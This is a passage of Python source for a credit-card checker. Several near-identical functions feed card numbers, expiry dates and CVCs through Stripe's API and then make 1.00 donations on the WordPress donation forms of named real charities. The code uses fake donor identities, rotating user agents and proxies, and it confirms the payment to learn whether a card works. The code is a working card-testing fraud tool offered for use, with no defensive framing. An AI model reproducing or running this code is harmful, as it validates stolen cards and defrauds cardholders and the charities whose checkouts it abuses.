    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F9390d43c1d%3B+stripe-js-v3%2F9390d43c1d%3B+card-element&referrer=https%3A%2F%2Fmoffittlegacyfoundation.org&time_on_page=20929&client_attribution_metadata[client_session_id]=82f8cd5d-08cf-48a0-837f-9f5768089e71&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Qn25AKOe28Np3cyqzOlt9G23838aZejSaGl8TI2K5jI4s56jghH15bMCFr8JWgwIjUrLHqFCILKmpYvNOVHexn3007aNZ9jsH'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G3 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    '_ga': 'GA1.1.1745641487.1764277891',
    '__stripe_mid': '1565da00-12ba-41c0-bfb5-093c8235799aa80493',
    'charitable_session': 'cadcb16531e05f3bcf03fbfe5b24a69e||86400||82800',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-12-08%2005%3A12%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fmoffittlegacyfoundation.org%2Fgive%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-12-08%2005%3A12%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fmoffittlegacyfoundation.org%2Fgive%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmoffittlegacyfoundation.org%2Fgive%2F',
    '__stripe_sid': 'b5d877f1-e69c-49db-9fe9-029207360087a8d038',
    '_ga_KFPPM0S0M8': 'GS2.1.s1765172534$o2$g0$t1765172538$j56$l0$h0',
        }
        headers = {
    'authority': 'moffittlegacyfoundation.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://moffittlegacyfoundation.org',
    'pragma': 'no-cache',
    'referer': 'https://moffittlegacyfoundation.org/give/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/give/',
    'campaign_id': f'{campaign_id}',
    'description': 'Texas Hill Country Flood Relief',
    'ID': f'{donation_id}',
    'gateway': 'stripe',
    'donation_amount': 'custom',
    'custom_donation_amount': '1.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'address': '24 George Street',
    'address_2': '',
    'city': 'Racie',
    'state': 'New South Walet',
    'postcode': '2000',
    'country': 'AU',
    'phone': '+61290123456',
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://moffittlegacyfoundation.org/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51Qn25AKOe28Np3cyqzOlt9G23838aZejSaGl8TI2K5jI4s56jghH15bMCFr8JWgwIjUrLHqFCILKmpYvNOVHexn3007aNZ9jsH',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 
  
#============================================
# --- Main CC Check Function ---
def go4(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

        proxy = get_random_proxy()
        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://nanda.org/nanda-i-foundation/support-nanda-foundation/', headers=headers, proxies=proxy)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G4 ID Response: {form_id}")
        print(f"G4 ID Response: {donation_nonce}")
        print(f"G4 ID Response: {campaign_id}")
        print(f"G4 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+card-element&referrer=https%3A%2F%2Fnanda.org&time_on_page=31306&client_attribution_metadata[client_session_id]=19d06d28-c917-4d60-9656-92d961c4ec44&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Mosx3KEssoNl8ScsWR4VQojp8Rofrf8eVjiFS34QVJLbLTExFsVah44zWW8AgF7vbRGz3SOxQeA9511AcmtFQF200izpe2876'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G4 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    'charitable_session': 'ceb3641a164082fc101a8bab6480b676||86400||82800',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-12-13%2019%3A06%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-12-13%2019%3A06%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F',
    'cookielawinfo-checkbox-necessary': 'yes',
    'cookielawinfo-checkbox-non-necessary': 'yes',
    '_ga': 'GA1.1.1526604562.1765650992',
    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9',
    'viewed_cookie_policy': 'yes',
    '__stripe_mid': '845dea7a-53f8-4272-aef1-757438bc743ec08807',
    '__stripe_sid': 'cda706fc-cf43-4d9b-88ad-794e37131fa8c6e5b2',
    '_ga_24R744NQFJ': 'GS2.1.s1765650991$o1$g0$t1765651002$j49$l0$h0',
        }
        headers = {
    'authority': 'nanda.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://nanda.org',
    'pragma': 'no-cache',
    'referer': 'https://nanda.org/nanda-i-foundation/support-nanda-foundation/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/nanda-i-foundation/support-nanda-foundation/',
    'campaign_id': f'{campaign_id}',
    'description': 'NANDA Foundation Donations',
    'ID': f'{donation_id}',
    'gateway': 'stripe',
    'custom_donation_amount': '1.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://nanda.org/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)
    proxies=proxy,    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51Mosx3KEssoNl8ScsWR4VQojp8Rofrf8eVjiFS34QVJLbLTExFsVah44zWW8AgF7vbRGz3SOxQeA9511AcmtFQF200izpe2876',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
    #proxies=proxy,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}")
        
#============================================
# --- Main CC Check Function ---
def go5(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://metazoonews.com/donate/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G5 ID Response: {form_id}")
        print(f"G5 ID Response: {donation_nonce}")
        print(f"G5 ID Response: {campaign_id}")
        print(f"G5 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+card-element&referrer=https%3A%2F%2Fmetazoonews.com&time_on_page=21111&client_attribution_metadata[client_session_id]=2e82e8d3-316c-4401-85c9-5aa774740bc3&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51SEyQFJHSyklWwJov5dWHnnLaivuSe8WFdfiZAVdC8aHcXu77yNSMSc1OheD2oh5yMmtsiR0c0K2rmSZOvF3HXsp00cZTnkoqN'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G5 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    'charitable_session': 'ca914662176e18f3145971224172d32c||86400||82800',
    'wpconsent_preferences': '{"essential":true,"statistics":false,"marketing":false}',
    '_ga_DVNJBWYMZ4': 'GS2.1.s1765651388$o1$g0$t1765651388$j60$l0$h0',
    '_ga': 'GA1.1.217029015.1765651389',
    '__stripe_mid': '9cab4fa1-76dc-4a51-a6ff-264098308928ae18d1',
    '__stripe_sid': '7a321c53-4187-44d3-96f2-030cf62b8ad521533c',
        }
        headers = {
    'authority': 'metazoonews.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://metazoonews.com',
    'pragma': 'no-cache',
    'referer': 'https://metazoonews.com/donate/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/donate/',
    'campaign_id': f'{campaign_id}',
    'description': 'MetaZoo News December Monthly Server Fund',
    'ID': f'{donation_id}',
    'donation_amount': 'custom',
    'custom_donation_amount': '1.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'gateway': 'stripe',
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://metazoonews.com/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51SEyQFJHSyklWwJov5dWHnnLaivuSe8WFdfiZAVdC8aHcXu77yNSMSc1OheD2oh5yMmtsiR0c0K2rmSZOvF3HXsp00cZTnkoqN',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 

#============================================
# --- Main CC Check Function ---
def go6(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://www.dohi.ca/campaigns/summer-camp-ukraine/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G6 ID Response: {form_id}")
        print(f"G6 ID Response: {donation_nonce}")
        print(f"G6 ID Response: {campaign_id}")
        print(f"G6 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fwww.dohi.ca&time_on_page=18271&client_attribution_metadata[client_session_id]=8e710883-c2bf-447e-859d-ec1d09218c59&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Qi5BILcqTD1o1N6EA79Mc7D98VpctqWDLKLFeA4XXmRVY5G6M7PUoZJJCJJhG7bqjFVP9R2rO1CRR8rdjodN6PR00WYir86gk'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G6 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    '_tccl_visitor': '80f64d4c-36b7-48f7-aed9-a36052317d58',
    'cmplz_banner-status': 'dismissed',
    'cmplz_policy_id': '28',
    'cmplz_marketing': 'deny',
    'cmplz_statistics': 'deny',
    'cmplz_preferences': 'deny',
    'cmplz_functional': 'allow',
    'cmplz_consented_services': '',
    '__stripe_mid': '526e6f9c-95d4-4af0-a925-6d7e37b14949f0aee3',
    'charitable_session': '4081c5cea29ebdf767b74fced4e64d81||86400||82800',
    '_tccl_visit': '81b4232e-bd37-455c-be95-6cec37fa860d',
    '_scc_session': 'pc=1&C_TOUCH=2025-12-18T06:24:22.490Z',
    '__stripe_sid': '1238082f-6e80-44da-a403-e7ebf67d645585459a',
        }
        headers = {
    'authority': 'www.dohi.ca',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.dohi.ca',
    'pragma': 'no-cache',
    'referer': 'https://www.dohi.ca/campaigns/summer-camp-ukraine/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/campaigns/summer-camp-ukraine/',
    'campaign_id': f'{campaign_id}',
    'description': 'Summer Camp Ukraine',
    'ID': f'{donation_id}',
    'donation_amount': 'custom',
    'custom_donation_amount': '1.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'address': '24 George Street',
    'address_2': '',
    'city': 'Racie',
    'state': 'New South Walet',
    'postcode': '2000',
    'country': 'AU',
    'phone': '+61290123456',
    'gateway': 'stripe',
    'stripe_payment_method': f'{pm}',
    'contact_consent': '1',
    'cover_fees': '1',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://www.dohi.ca/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51Qi5BILcqTD1o1N6EA79Mc7D98VpctqWDLKLFeA4XXmRVY5G6M7PUoZJJCJJhG7bqjFVP9R2rO1CRR8rdjodN6PR00WYir86gk',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
